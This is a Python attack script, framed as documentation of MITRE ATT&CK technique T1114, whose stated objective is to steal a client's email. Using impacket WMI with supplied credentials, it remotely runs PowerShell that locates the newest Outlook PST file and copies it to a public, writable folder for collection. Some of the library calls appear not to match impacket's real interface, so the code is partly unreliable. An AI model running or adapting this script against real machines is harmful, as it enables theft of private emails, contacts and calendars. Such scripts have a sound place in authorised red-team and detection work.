# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1114 - Email Collection
# Objective: Steal email data from a client.
# This script uses WMI to run a PowerShell command on the target machine to
# find and copy the primary Outlook PST file (which contains all emails, contacts, and calendar items) to a public, writable directory.

#!/usr/bin/env python3
import sys
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi

def collect_email(target, username, password, domain):
    try:
        print(f"[*] Attempting to collect Outlook PST file from {target}...")
        dcom = DCOMConnection(target, username, password, domain)
        wmi_interface = wmi.WMIConnection(dcom)

        # Command to find the Outlook PST file in the user's AppData and copy it to a public folder.
        # It finds the most recently modified PST file to handle multiple profiles.
        command = """
        powershell.exe -Command "
        $pstPath = Get-ChildItem -Path $env:LOCALAPPDATA\\Microsoft\\Outlook -Filter '*.pst' -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName;
        if ($pstPath) { Copy-Item -Path $pstPath -Destination 'C:\\Users\\Public\\Downloads\\outlook.pst' -Force; Write-Host 'PST copied to C:\\Users\\Public\\Downloads\\outlook.pst'; }
        else { Write-Host 'No PST file found'; }
        "
        """
        
        print(f"[*] Executing WMI command to locate and copy PST file...")
        wmi_interface.ExecMethod('Win32_Process', 'Create', {'CommandLine': command})
        
        print("[+] Command sent. Check C:\\Users\\Public\\Downloads\\outlook.pst on the target.")
        dcom.disconnect()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1114_email_collection.py <target> <username> <password> <domain>")
        sys.exit(1)

    collect_email(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])